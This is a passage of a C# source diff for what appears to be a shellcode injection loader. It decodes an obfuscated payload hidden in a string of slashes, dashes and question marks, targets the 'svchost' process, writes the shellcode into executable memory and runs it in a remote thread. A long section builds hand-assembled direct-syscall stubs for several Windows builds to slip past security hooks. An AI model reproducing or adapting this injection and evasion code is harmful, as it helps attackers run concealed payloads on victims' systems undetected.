   ? /      /     ?-/   /     ?-/     /  ?  /  /      ? /       /-? /        /         ?-/  /  ?-/ /      ?  /-/ ?-/   /-?-/     /     ?-/ /     ? /-/    ?-/ /       ? /   /   ? /     /  ? /    /         ?-/  /   ? /        /         ? /     /      ? /       /-? / /         ? /    /         ?  /  /         ? /    /-?-/         /    ?  /   /-?-/      /         ?-/ /-? / /      ?  / /     ?  / /       ? /         /      ?-/  /   ? /       /         ?-/ /    ?  /     /    ? /     /     ? /     /         ?  / /      ?-/  /-?-/ /     ? /        /         ? /   /    ? /    /      ? /        /    ?-/         /  ? /     /   ?  /  /        ?-/  /  ?-/     /     ?-/   /-? /-/     ? /       /-? /     /         ?-/   /        ?-/ /   ?-/   /-? /        /         ?  /     /-?-/-/  ? /        /-?  / /    ?-/ /     ? /   /       ? / /-?  /     /     ? /   /    ? /        /       ?-/      /-? /  /   ? /     /  ?-/-/     ? /     /-?-/     /         ? /    /   ? /   /         ?-/      / ?  /   /         ?-/     /       ? /       /       ? /       /    ? /  /  ?  /-/     ? /         /        ?  / /      ?  /  /   ? /     /      ?  /     /   ? /    /  ?-/      /       ?-/  /  ?  / /-? /        /    ?-/         /  ? /     /   ?  /  /    ?-/  /  ?-/     /     ?-/   /-?  /   /      ? /        /         ?-/         /  ?  / /   ? /    /-?-/  /       ? /        /         ? /    /  ? /     /-? /        / ?  / /    ?-/-/         ? /   /   ?  / /  ?-/     /-?-/       /-? /         /    ?  /     /   ?-/-/       ? /     /  ? /     /      ?-/   /-? / /-? /    /    ?  / / ? /      /      ? /     /-? /  /         ? /   /   ?-/-/      ? / /         ? /    /        ? /         /    ? /  /       ?-/     /         ?  /    /         ? /   /   ?-/ /   ?  /-/ ?-/    /      ?  / /-? /        /         ? /    /  ? /   / ? /    /-?  / /  ?-/   /      ?-/   /         ?  /  / ?-/-/   ?-/    /-?-/   /        ? /     /   ?-/  /   ? /    /-?  /-/       ? /   /        ?  /     /  ?  / /     ?  / /       ? /         /      ?-/         /     ?-/     /    ? /   /    ?-/-/       ? / /   ?  / /    ?  / /      ? /         /      ?-/         /     ? / /         ? / /      ? /        /       ? / /         ? /        /    ?-/         /    ?-/     /         ? /   /        ? /    / ?-/    /      ? /     / ?  / /    ?  /  / ? /     /  ? /  /      ?  /    /         ? /      /   ? / /     ?-/  /   ?-/-/   ?-/-/  ? /    /     ?-/       / ? /     /     ?-/   /-?  /    /  ? /    /-? /  /        ?  /  / ?-/        /         ?-/      /   ? /         / ?-/      /       ?  /-/   ?-/    /         ? /        /       ? /         /      ? /       / ? /       / ?-/     /   ?-/     /    ? /     / ?  /-/   ? / /       ?-/ /   ?-/   /        ?-/ /       ?-/      /-?-/        /       ? /      /  ?  /   /   ?  /     /  ?";
+        int ProcId = FindUserPID( ResolvProcessName(name) );
+        byte [] scode = ResolveShellCode(Morse);
         CLIENT_ID clientid = new CLIENT_ID();
         clientid.UniqueProcess = new IntPtr(ProcId);
         clientid.UniqueThread = IntPtr.Zero;
@@ -717,27 +874,81 @@ public class Code
         IntPtr procHandle = IntPtr.Zero;
         ZwOpenProcess(ref procHandle, ProcessAccessFlags.All, new OBJECT_ATTRIBUTES(), ref clientid);
         IntPtr allocMemAddress = new IntPtr();
-        UIntPtr ShellcodeSize =  (UIntPtr)(UInt32)shellcode.Length;
-        NtAllocateVirtualMemory(procHandle, ref allocMemAddress, new IntPtr(0), ref ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        IntPtr unmanagedPointer = Marshal.AllocHGlobal(shellcode.Length);
-        Marshal.Copy(shellcode, 0, unmanagedPointer, shellcode.Length);
-        ZwWriteVirtualMemory(procHandle, ref allocMemAddress, unmanagedPointer, (UInt32)(shellcode.Length), ref byteWritten);
-        int temp1 = 0;
-        int temp2 = 0;
-        unsafe { NtCreateThreadExBuffer nb = new NtCreateThreadExBuffer { Size = sizeof(NtCreateThreadExBuffer), Unknown1 = 0x10003, Unknown2 = 0x8, Unknown3 = new IntPtr(&temp2), Unknown4 = 0, Unknown5 = 0x10004, Unknown6 = 4, Unknown7 = new IntPtr(&temp1), Unknown8 = 0, }; };
+        UIntPtr scodeSize = (UIntPtr)(UInt32)scode.Length;
+        ZwAllocateVirtualMemory(procHandle, ref allocMemAddress, new IntPtr(0), ref scodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        IntPtr unmanagedPointer = Marshal.AllocHGlobal(scode.Length);
+        Marshal.Copy(scode, 0, unmanagedPointer, scode.Length);
+        ZwWriteVirtualMemory(procHandle, ref allocMemAddress, unmanagedPointer, (UInt32)(scode.Length), ref byteWritten);
+        Marshal.FreeHGlobal(unmanagedPointer);
         IntPtr hRemoteThread;
-        // This is supposed to execute from .dll not .exe file, one have to change sizeOfStackCommit and sizeOfStackReserve
-        NtCreateThreadEx(out hRemoteThread, GENERIC_ALL, IntPtr.Zero, procHandle, allocMemAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
-        return 0;
+        ZwCreateThreadEx(out hRemoteThread, GENERIC_ALL, IntPtr.Zero, procHandle, allocMemAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
+        CloseHandle(hRemoteThread);
+        CloseHandle(procHandle);
+  }
+
+      public static string ResolvProcessName(string c)
+      {
+          string result = "";
+          int num = 0;
+          int index = 0;
+          string tmp = "";
+          for (int i = 1; i <= c.Length; i++) {
+              tmp = c.Substring(index, 1);
+                  if (tmp == " ") { num++; index++; }
+                  else if (tmp == "?") {
+                  if (num == 19) { result = result + "s"; num = 0; }
+                  else
+                  if (num == 22) { result = result + "v"; num = 0; }
+                  else
+                  if (num == 3) { result = result + "c"; num = 0; }
+                  else
+                  if (num == 8) { result = result + "h"; num = 0; }
+                  else
+                  if (num == 15) { result = result + "o"; num = 0; }
+                  else
+                  if (num == 20) { result = result + "t"; num = 0; }
+                  index++;
+              }
+          }
+          return result;
       }
 
+      public static byte [] ResolveShellCode(string _P1)
+      {
+          byte [] _L1 = new byte [1];
+          int _N1 = 0;
+          string _N2 = "";
+          int _N3 = 0;
+          int _N4 = 0;
+          for (int i = 1; i <= _P1.Length; i++) { if (_P1.Substring(_N3, 1) == " ") { _N1++; }
+              else if (_P1.Substring(_N3, 1) == "|" || _P1.Substring(_N3,1) == "/") { if (_N1 > 0) { _N2 = _N2 + _N1.ToString(); _N1 = 0; } }
+              else if (_P1.Substring(_N3, 1) == "-") { _N2 = _N2 + "0"; _N1 = 0; }
+              else if (_P1.Substring(_N3, 1) == "?") { if (_P1.Substring(_N3 - 1, 1) == "?" || _P1.Substring(_N3 - 1, 1) == "-")
+              {
+                  Array.Resize(ref _L1, _N4 + 1);
+                  _L1[_N4] = Byte.Parse( _N2 );
+                  _N2 = "";
+                  _N1 = 0;
+                  _N4++;
+              }
+              else {
+                  Array.Resize(ref _L1, _N4 + 1);
+                  _L1[_N4] = Byte.Parse( _N2 + _N1.ToString() );
+                  _N2 = "";
+                  _N1 = 0;
+                  _N4++;
+              } }
+              _N3++;
+          }
+          return _L1;
+      }
 
       private static string GetProcessUser(Process process)
       {
           IntPtr processHandle = IntPtr.Zero;
           try
           {
-              OpenProcessToken(process.Handle, 8, out processHandle);
+              ZwOpenProcessToken(process.Handle, 8, out processHandle);
               WindowsIdentity wi = new WindowsIdentity(processHandle);
               string user = wi.Name;
               return user.Contains(@"\") ? user.Substring(user.IndexOf(@"\") + 1) : user;
@@ -776,7 +987,652 @@ public class Code
         return foundPID;
       }
 
+
+      public static byte [] GetOSVersionAndReturnSyscall(int sysType )
+      {
+          var syscall = new byte [] { 001, 001, 001, 001, 001, 000, 000, 000, 001, 001, 001 };
+          var osVersionInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
+          NTSTATUS OSdata = RtlGetVersion(ref osVersionInfo);
+
+          if (osVersionInfo.dwPlatformId == 2) // Client OS
+          {
+              if (osVersionInfo.dwBuildNumber == 18362 || osVersionInfo.dwBuildNumber == 18363 )
+              {
+                  switch (sysType)
+                  {
+                      case 1: // ZwOpenProcess
+                      unsafe
+                      {
+                        fixed (byte* ptr = syscall)
+                        {
+                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x25);
+                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                      }
+                      break;
+
+                      case 2: // ZwCreateThreadEx
+                      unsafe
+                      {
+                          fixed (byte* ptr = syscall)
+                          {
+                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0xBC);
+                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                          }
+                      }
+                      break;
+
+                      case 3: // ZwWriteVirtualMemory
+                      unsafe
+                      {
+                          fixed (byte* ptr = syscall)
+                          {
+                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x39);
+                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                          }
+                      }
+                      break;
+
+                      case 4: // ZwAllocateVirtualMemory
+                      unsafe
+                      {
+                          fixed (byte* ptr = syscall)
+                          {
+                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x17);
+                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0e);
+                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                          }
+                      }
+                      break;
+
+                      case 5: // ZwCreateSection
+                      unsafe
+                      {
+                          fixed (byte* ptr = syscall)
+                          {
+                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x49);
+                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                          }
+                      }
+                      break;
+
+                      case 6: // ZwMapViewOfSection
+                      unsafe
+                      {
+                          fixed (byte* ptr = syscall)
+                          {
+                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x27);
+                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                          }
+                      }
+                      break;
+
+                      case 7: // ZwCreateProcess
+                      unsafe
+                      {
+                          fixed (byte* ptr = syscall)
+                          {
+                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x76);
+                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                          }
+                      }
+                      break;
+
+                      case 8: // ZwOpenThread
+                      unsafe
+                      {
+                          fixed (byte* ptr = syscall)
+                          {
+                              *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                              *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                              *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                              *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                              *(ptr + 4) = (byte) ( *(ptr + 4) + 0x128);
+                              *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                              *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                              *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                              *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                              *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                              *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                          }
+                     }
+                     break;
+
+                     case 9: // ZwResumeThread
+                     unsafe
+                     {
+                         fixed (byte* ptr = syscall)
+                         {
+                             *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                             *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                             *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                             *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                             *(ptr + 4) = (byte) ( *(ptr + 4) + 0x51);
+                             *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                             *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                             *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                             *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                             *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                             *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                         }
+                    }
+                    break;
+
+                    case 10: // ZwOpenProcessToken
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x122);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                   }
+                   break;
+
+
+
+                  } //switch (sysType)
+              } // if
+              else
+              if (osVersionInfo.dwBuildNumber == 17763)
+              {
+                switch (sysType)
+                {
+                    case 1: // ZwOpenProcess
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x25);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 2: // ZwCreateThreadEx
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0xBB);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 3: // ZwWriteVirtualMemory
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x39);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 4: // ZwAllocateVirtualMemory
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x17);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x03);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 5: // ZwCreateSection
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x49);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 6: // ZwMapViewOfSection
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x27);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 7: // ZwCreateProcess
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0xB3);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 8: // ZwOpenThread
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0xb3);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 9: // ZwResumeThread
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x51);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                   }
+                   break;
+
+                   case 10: // ZwOpenProcessToken
+                   unsafe
+                   {
+                       fixed (byte* ptr = syscall)
+                       {
+                           *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                           *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                           *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                           *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                           *(ptr + 4) = (byte) ( *(ptr + 4) + 0x121);
+                           *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                           *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                           *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                           *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                           *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                           *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                       }
+                  }
+                  break;
+
+
+              } // switch (sysType)
+            } // if
+              else
+              if (osVersionInfo.dwBuildNumber == 17134)
+              {
+                switch (sysType)
+                {
+                    case 1: // ZwOpenProcess
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x25);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 2: // ZwCreateThreadEx
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0xBA);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 3: // ZwWriteVirtualMemory
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
+                            *(ptr + 1) = (byte) ( *(ptr + 1) + 0x88);
+                            *(ptr + 2) = (byte) ( *(ptr + 2) + 0xC9);
+                            *(ptr + 3) = (byte) ( *(ptr + 3) + 0xB7);
+                            *(ptr + 4) = (byte) ( *(ptr + 4) + 0x39);
+                            *(ptr + 5) = (byte) ( *(ptr + 5) + 0x00);
+                            *(ptr + 6) = (byte) ( *(ptr + 6) + 0x00);
+                            *(ptr + 7) = (byte) ( *(ptr + 7) + 0x00);
+                            *(ptr + 8) = (byte) ( *(ptr + 8) + 0x0E);
+                            *(ptr + 9) = (byte) ( *(ptr + 9) + 0x04);
+                            *(ptr + 10) = (byte) ( *(ptr + 10) + 0xC2);
+                        }
+                    }
+                    break;
+
+                    case 4: // ZwAllocateVirtualMemory
+                    unsafe
+                    {
+                        fixed (byte* ptr = syscall)
+                        {
+                            *(ptr + 0) = (byte) ( *(ptr + 0) + 0x48);
